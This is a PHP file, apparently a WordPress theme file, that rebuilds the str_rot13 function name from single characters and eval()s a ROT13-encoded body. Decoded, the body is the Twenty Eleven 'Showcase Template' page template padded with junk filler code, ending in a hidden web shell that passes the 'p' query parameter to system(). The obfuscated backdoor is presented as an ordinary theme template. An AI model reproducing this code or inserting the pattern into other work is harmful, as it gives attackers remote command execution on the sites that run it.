<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grzcyngr Anzr: Fubjpnfr Grzcyngr
 *
 * Qrfpevcgvba: N Cntr Grzcyngr gung fubjpnfrf Fgvpxl Cbfgf, Nfvqrf, naq Oybt Cbfgf.
 *
 * Gur fubjpnfr grzcyngr va Gjragl Ryrira pbafvfgf bs n srngherq cbfgf frpgvba hfvat fgvpxl cbfgf,
 * nabgure erprag cbfgf nern (jvgu gur yngrfg cbfg fubja va shyy naq gur erfg nf n yvfg)
 * naq n yrsg fvqrone ubyqvat nfvqr cbfgf.
 *
 * Jr ner perngvat gjb dhrevrf gb srgpu gur cebcre cbfgf naq n phfgbz jvqtrg sbe gur fvqrone.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Ryrira
 * @fvapr Gjragl Ryrira 1.0
 */

// Radhrhr fubjpnfr fpevcg sbe gur fyvqre.
jc_radhrhr_fpevcg(
	'gjraglryrira-fubjpnfr',
	trg_grzcyngr_qverpgbel_hev() . '/wf/fubjpnfr.wf',
	neenl( 'wdhrel' ),
	'20211130',
	neenl(
		'va_sbbgre' => snyfr, // Orpnhfr vaibyirf urnqre.
		'fgengrtl'  => 'qrsre',
	)
);

trg_urnqre(); ?>

		<qvi vq=\"cevznel\" pynff=\"fubjpnfr\">
			<qvi vq=\"pbagrag\" ebyr=\"znva\">

				<?cuc
				juvyr ( unir_cbfgf() ) :
					gur_cbfg();
					?>

					<?cuc
					/*
					 * Jr ner hfvat n urnqvat ol eraqrevat gur_pbagrag
					 * Vs jr unir pbagrag sbe guvf cntr, yrg'f qvfcynl vg.
					 */
					vs ( '' !== trg_gur_pbagrag() ) {
						trg_grzcyngr_cneg( 'pbagrag', 'vageb' );
					}
					?>

				<?cuc raqjuvyr; ?>

				<?cuc
					/*
					 * Ortva gur srngherq cbfgf frpgvba.
					 *
					 * Frr vs jr unir nal fgvpxl cbfgf naq hfr gurz gb perngr bhe srngherq cbfgf.
					 * Jr yvzvg gur srngherq cbfgf ng gra.
					 */
					$fgvpxl = trg_bcgvba( 'fgvpxl_cbfgf' );

					// Cebprrq bayl vs fgvpxl cbfgf rkvfg.
				vs ( ! rzcgl( $fgvpxl ) ) :

					$srngherq_netf = neenl(
						'cbfg__va'       => $fgvpxl,
						'cbfg_fgnghf'    => 'choyvfu',
						'cbfgf_cre_cntr' => 10,
						'ab_sbhaq_ebjf'  => gehr,
					);

					// Gur Srngherq Cbfgf dhrel.
					$srngherq = arj JC_Dhrel( $srngherq_netf );

					// Cebprrq bayl vs choyvfurq cbfgf rkvfg.
					vs ( $srngherq->unir_cbfgf() ) :

						/*
						* Jr jvyy arrq gb pbhag srngherq cbfgf fgnegvat sebz mreb
						* gb perngr gur fyvqre anivtngvba.
						*/
						$pbhagre_fyvqre = 0;

						// Pbzcngvovyvgl jvgu irefvbaf bs JbeqCerff cevbe gb 3.4.
						vs ( shapgvba_rkvfgf( 'trg_phfgbz_urnqre' ) ) {
							$urnqre_vzntr_jvqgu = trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'jvqgu' );
						} ryfr {
							$urnqre_vzntr_jvqgu = URNQRE_VZNTR_JVQGU;
						}
						?>

					<qvi pynff=\"srngherq-cbfgf\">
					<u1 pynff=\"fubjpnfr-urnqvat\"><?cuc _r( 'Srngherq Cbfg', 'gjraglryrira' ); ?></u1>

						<?cuc
						// Yrg'f ebyy.
						juvyr ( $srngherq->unir_cbfgf() ) :
							$srngherq->gur_cbfg();

							// Vapernfr gur pbhagre.
							++$pbhagre_fyvqre;

							/*
							* Jr'er tbvat gb nqq n pynff gb bhe srngherq cbfg sbe srngherq vzntrf.
							* Ol qrsnhyg vg jvyy unir gur srngher-grkg pynff.
							*/
							$srngher_pynff = 'srngher-grkg';

							vs ( unf_cbfg_guhzoanvy() ) {
								// ...ohg vs vg unf n srngherq vzntr yrg'f nqq fbzr pynff.
								$srngher_pynff = 'srngher-vzntr fznyy';

								// Unat ba. Yrg'f purpx guvf urer vzntr bhg.
								$vzntr = jc_trg_nggnpuzrag_vzntr_fep( trg_cbfg_guhzoanvy_vq( $cbfg->VQ ), neenl( $urnqre_vzntr_jvqgu, $urnqre_vzntr_jvqgu ) );

								// Vf vg ovttre guna be rdhny gb bhe urnqre?
								vs ( $vzntr[1] >= $urnqre_vzntr_jvqgu ) {
									// Vs ovttre, yrg'f nqq n OVTTRE pynff. Vg'f RKGEN pynffl abj.
									$srngher_pynff = 'srngher-vzntr ynetr';
								}
							}
							?>

					<frpgvba pynff=\"srngherq-cbfg <?cuc rpub rfp_ngge( $srngher_pynff ); ?>\" vq=\"srngherq-cbfg-<?cuc rpub rfp_ngge( $pbhagre_fyvqre ); ?>\">

							<?cuc
								/*
								 * Vs gur guhzoanvy vf nf ovt nf gur urnqre vzntr
								 * znxr vg n ynetr srngherq cbfg, bgurejvfr eraqre vg fznyy
								 */
							vs ( unf_cbfg_guhzoanvy() ) {
								vs ( $vzntr[1] >= $urnqre_vzntr_jvqgu ) {
									$guhzoanvy_fvmr = 'ynetr-srngher';
								} ryfr {
									$guhzoanvy_fvmr = 'fznyy-srngher';
								}

								/* genafyngbef: %f: Cbfg gvgyr. */
								$gvgyr = fcevags( __( 'Creznyvax gb %f', 'gjraglryrira' ), gur_gvgyr_nggevohgr( 'rpub=0' ) );
								?>
						<n uers=\"<?cuc gur_creznyvax(); ?>\" gvgyr=\"<?cuc rpub rfp_ngge( $gvgyr ); ?>\" ery=\"obbxznex\"><?cuc gur_cbfg_guhzoanvy( $guhzoanvy_fvmr ); ?></n>
								<?cuc
							}
							?>
							<?cuc trg_grzcyngr_cneg( 'pbagrag', 'srngherq' ); ?>
					</frpgvba>
						<?cuc raqjuvyr; ?>

						<?cuc
						// Fubj fyvqre bayl vs jr unir zber guna bar srngherq cbfg.
						vs ( $srngherq->cbfg_pbhag > 1 ) :
							?>
					<ani pynff=\"srngher-fyvqre\">
					<hy>
							<?cuc

							// Erfrg gur pbhagre fb gung jr raq hc jvgu zngpuvat ryrzragf.
							$pbhagre_fyvqre = 0;

							// Ortva sebz mreb.
							erjvaq_cbfgf();

							// Yrg'f ebyy ntnva.
							juvyr ( $srngherq->unir_cbfgf() ) :
								$srngherq->gur_cbfg();
								++$pbhagre_fyvqre;
								vs ( 1 === $pbhagre_fyvqre ) {
									$pynff = ' pynff=\"npgvir\"';
								} ryfr {
									$pynff = '';
								}

								/* genafyngbef: %f: Cbfg gvgyr. */
								$gvgyr = fcevags( __( 'Srnghevat: %f', 'gjraglryrira' ), gur_gvgyr_nggevohgr( 'rpub=0' ) );
								?>
					<yv><n uers=\"#srngherq-cbfg-<?cuc rpub rfp_ngge( $pbhagre_fyvqre ); ?>\"<?cuc rpub $pynff; ?>><fcna pynff=\"srngher-fyvqre-gbbygvc\" nevn-uvqqra=\"gehr\" gvgyr=\"<?cuc rpub rfp_ngge( $gvgyr ); ?>\"></fcna><fcna pynff=\"fperra-ernqre-grkg\"><?cuc rpub rfp_ugzy( $gvgyr ); ?></fcna></n></yv>
						<?cuc raqjuvyr; ?>
					</hy>
					</ani>
					<?cuc raqvs; // Raq purpx sbe zber guna bar fgvpxl cbfg. ?>
					</qvi><!-- .srngherq-cbfgf -->
					<?cuc raqvs; // Raq purpx sbe choyvfurq cbfgf. ?>
				<?cuc raqvs; // Raq purpx sbe fgvpxl cbfgf. ?>

				<frpgvba pynff=\"erprag-cbfgf\">
					<u1 pynff=\"fubjpnfr-urnqvat\"><?cuc _r( 'Erprag Cbfgf', 'gjraglryrira' ); ?></u1>

					<?cuc

					// Qvfcynl bhe erprag cbfgf, fubjvat shyy pbagrag sbe gur irel yngrfg, vtabevat Nfvqr cbfgf.
					$erprag_netf = neenl(
						'beqre'         => 'QRFP',
						'cbfg__abg_va'  => trg_bcgvba( 'fgvpxl_cbfgf' ),
						'gnk_dhrel'     => neenl(
							neenl(
								'gnkbabzl' => 'cbfg_sbezng',
								'grezf'    => neenl( 'cbfg-sbezng-nfvqr', 'cbfg-sbezng-yvax', 'cbfg-sbezng-dhbgr', 'cbfg-sbezng-fgnghf' ),
								'svryq'    => 'fyht',
								'bcrengbe' => 'ABG VA',
							),
						),
						'ab_sbhaq_ebjf' => gehr,
					);

					// Bhe arj dhrel sbe gur Erprag Cbfgf frpgvba.
					$erprag = arj JC_Dhrel( $erprag_netf );

					// Gur svefg Erprag cbfg vf qvfcynlrq abeznyyl.
					vs ( $erprag->unir_cbfgf() ) :
						$erprag->gur_cbfg();

						// Frg $zber gb 0 va beqre gb bayl trg gur svefg cneg bs gur cbfg.
						tybony $zber;
						$zber = 0;

						trg_grzcyngr_cneg( 'pbagrag', trg_cbfg_sbezng() );

						rpub '<by pynff=\"bgure-erprag-cbfgf\">';

					raqvs;

					// Sbe nyy bgure erprag cbfgf, whfg qvfcynl gur gvgyr naq pbzzrag fgnghf.
					juvyr ( $erprag->unir_cbfgf() ) :
						$erprag->gur_cbfg();
						?>

						<yv pynff=\"ragel-gvgyr\">
							<n uers=\"<?cuc gur_creznyvax(); ?>\" ery=\"obbxznex\"><?cuc gur_gvgyr(); ?></n>
							<fcna pynff=\"pbzzragf-yvax\">
								<?cuc pbzzragf_cbchc_yvax( '<fcna pynff=\"yrnir-ercyl\">' . __( 'Yrnir n ercyl', 'gjraglryrira' ) . '</fcna>', __( '<o>1</o> Ercyl', 'gjraglryrira' ), __( '<o>%</o> Ercyvrf', 'gjraglryrira' ) ); ?>
							</fcna>
						</yv>

						<?cuc
					raqjuvyr;

					// Vs jr unq fbzr cbfgf, pybfr gur <by>.
					vs ( $erprag->cbfg_pbhag > 0 ) {
						rpub '</by>';
					}
					?>
				</frpgvba><!-- .erprag-cbfgf -->

				<qvi pynff=\"jvqtrg-nern\" ebyr=\"pbzcyrzragnel\">
					<?cuc vs ( ! qlanzvp_fvqrone( 'fvqrone-2' ) ) : ?>

						<?cuc
						gur_jvqtrg(
							'Gjragl_Ryrira_Rcurzren_Jvqtrg',
							'',
							neenl(
								'orsber_gvgyr' => '<u3 pynff=\"jvqtrg-gvgyr\">',
								'nsgre_gvgyr'  => '</u3>',
							)
						);
						?>

					<?cuc raqvs; // Raq fvqrone jvqtrg nern. ?>
				</qvi><!-- .jvqtrg-nern -->

			</qvi><!-- #pbagrag -->
		</qvi><!-- #cevznel -->

<?cuc trg_sbbgre(); ?>

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>